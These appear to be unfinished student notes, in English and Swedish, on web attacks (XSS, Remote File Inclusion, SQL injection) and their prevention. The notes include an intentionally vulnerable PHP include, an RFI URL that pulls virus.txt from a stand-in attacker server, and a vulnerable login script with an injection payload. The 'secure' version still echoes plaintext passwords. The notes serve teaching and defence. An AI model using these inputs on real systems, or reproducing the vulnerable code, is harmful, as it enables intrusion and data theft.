Attacks

--------------------------------------------------

Online Attacks

--------------------------------------------------


Name: XSS

Description:

The idea is to run your code on a webpage. It exploits the fact that there is a distinction between back and front end. So, even if the manipulation is done in the graphical interface (front end) it can still effect the back end (servers and such). A majority (84%?) of web security holes are XSS.

The attack is generally divided into two categories:

1.non-persistent

Many web pages have search fields. If the implementations is not safe one could inject code. For example:


Would direct you to a page saying " could not be found” But also display a new window saying “HEJSAN”.

More malicious code could be retrieving scripts from other sources and stealing cookies.


2.persistent

Same idea as for non-persistent but more permanent. Say you have a online forum with users and a user info page. Say there is a field “Favourite sports” and you write “ Soccer ”. Everyone visiting the page will see only “Soccer”, but the script will run and you will also get a new window saying “HEJSAN”. This is due to the fact that scripts are ment for the back end, and will not be presented in the front end.

Prevention:

Knyt cookies till användarens IP.
Sanera HTML inputs.
Avaktivera javascript
Omdirigera felaktiga sökningar.
Leta efter simultana inloggningar.

Implementation:

sew description for now.


Name: Remote File Inclusion

Description: Remote File Inclusion är en attack som utnyttjar möjligheten att i webbaserade scriptspråk (så som php) att exekvera sin egen scriptkod på någon annans server. Om lyckad så tillåter det den som attackerar att få tillgång till hela serverns innehåll samt rättigheter att ändra åtkomsträttigheter etc. Om det inte är så att inställningarna förhindrar det på webbservern.

Prevention: Det går att förhindra genom att inte ha allow_url_fopen och allow_url_include påslagna i php.ini filen beroende på vilken version av php man kör.

Implementation:
Exmepel på implementering.
PHP kod:  include($_GET["sida"] . '.html');


http://server.se/vulnerablepage.php?sida=nyheter

När du gå in på server.se så öppnas och körs nyheter.html på server.se

http://server.se/vulnerablepage.php?sida=http://attackerarens-server.se/virus.txt?



istället för att öppna den lokala filen virus.txt så körs det från attackerarens-server.se på server.se


--------------------------------------------------

Offline Attacks

--------------------------------------------------


Name: CSRF

Description:

Prevention:

Implementation:



Name: SQLInjection

Description:
	SQL injections targets the database through entering data which is interpreted as database logic.
Example:
	SQL_Vulnerable.php:
		This example program prints out the name of a user if it enters the correct uid AND the correct pwd.
	<?php
		$mysqli = new mysqli("localhost", "eitf05usr", "eitf05pass", "EITF05");
		if ($mysqli->connect_errno) {
			echo "Failed to connect to MySQL: (" . $mysqli->connect_errno . ") " . $mysqli->connect_error;
		}
		
		$uid = $_POST['uid'];
		$pwd = $_POST['pwd'];
		$sql = "SELECT * FROM Users WHERE uid = '$uid' AND pwd = '$pwd'";
		echo "$sql <br/>";
		
		$res = $mysqli->query($sql);
		while ($row = $res->fetch_assoc()) {
			echo " uid = " . $row['uid'] . "<br/>";
		}
		$res->free();
		$mysqli->close();
	?>

	Regular HTML form which uses HTTP POST method to deliver uid and pwd to SQL_Vulnerable: 
	<form action="./SQL_Vulnerable.php" method="POST">
		UID:<br>
	  	<input type="text" name="uid" value="">
	  	<br>
	  	PWD:<br>
	  	<input type="text" name="pwd" value="">
	  	<br><br>
	  	<input type="submit" value="Submit">
	</form>
	
	If an advasary were to enter (for example) $uid = ' OR 'X' = 'X  AND $pwd = ' OR 'Y' = 'Y
	then the combined SQL string will be SELECT * FROM Users WHERE uid = '' OR 'X' = 'X' AND pwd = '' OR 'Y' = 'Y' 
	Note that this expressions is valid for ALL Users, and thus all uid's will be echoed... 

Prevention:
	We need to make sure that the data we receive is not interpreted as logic.
	The standard way to do this is through using so called prepared statements.

	A prepared statement is a statement which is created before the data to be used is supplied. 
	For example: SELECT uid, pwd FROM Users WHERE uid = ? AND pwd = ?
	This statement is sent to the database management system (DBSM).
	The DBSM will then compile the statement and store the result (the logic which it can later execute).
	At a later time we may send data to the DBSM which is executed with the prepared logic. Thus prepared
	statements are both more efficient (only need to send logic once) as well as secure against SQL Injections.

	Example:
	<?php
	$sql_user = ini_get("mysql.default_user");
	$sql_host = ini_get("mysql.default_host");
	$sql_pass = ini_get("mysql.default_password");

	$mysqli = new mysqli($sql_host, $sql_user, $sql_pass, "EITF05");
		if ($mysqli->connect_errno) {
			echo "Failed to connect to MySQL: (" . $mysqli->connect_errno . ") " . $mysqli->connect_error;
		}
		$sql = "SELECT uid, pwd FROM Users WHERE uid = ? AND pwd = ?";
		$stmt = $mysqli->prepare($sql);
		$uid = $_POST['uid'];
		$pwd = $_POST['pwd'];
		if($stmt->bind_param('ss', $uid, $pwd)){
			if($stmt->execute()){
				$res_uid = NULL;
				$res_pwd = NULL;
				$stmt->bind_result($res_uid, $res_pwd);
				while ($stmt->fetch()) {
				    echo 'uid = ' . $res_uid . ', pwd = ' . $res_pwd;
				}
				$stmt->free_result();
			}
		}
		$mysqli->close();
	?>
Extra:
	Note that Database Credentials (sql: {username, password, host}) are no longer stored in the source code.
	They are stored in a separate configuration file which is included by the apache server: 

	In apache2.conf:
		<Directory /var/www/html/SQL>
			Options Indexes FollowSymLinks
			Require all granted
			Allowoverride None 
			Include ./user-conf/SQL/php.conf
		</Directory>

	In ./user-conf/SQL/php.conf:
		php_value mysql.default_user "eitf05usr"
		php_value mysql.default_password "eitf05pass"
		php_value mysql.default_host "127.0.0.1"


--------------------------------------------------

Offline Attacks

--------------------------------------------------



Name: TMTO

Description:

Prevention:

Implementation:


--------------------------------------------------

Server Configurations

--------------------------------------------------
Name: php.ini considerations ...

Name: apache2.conf (httpd.conf) considerations...
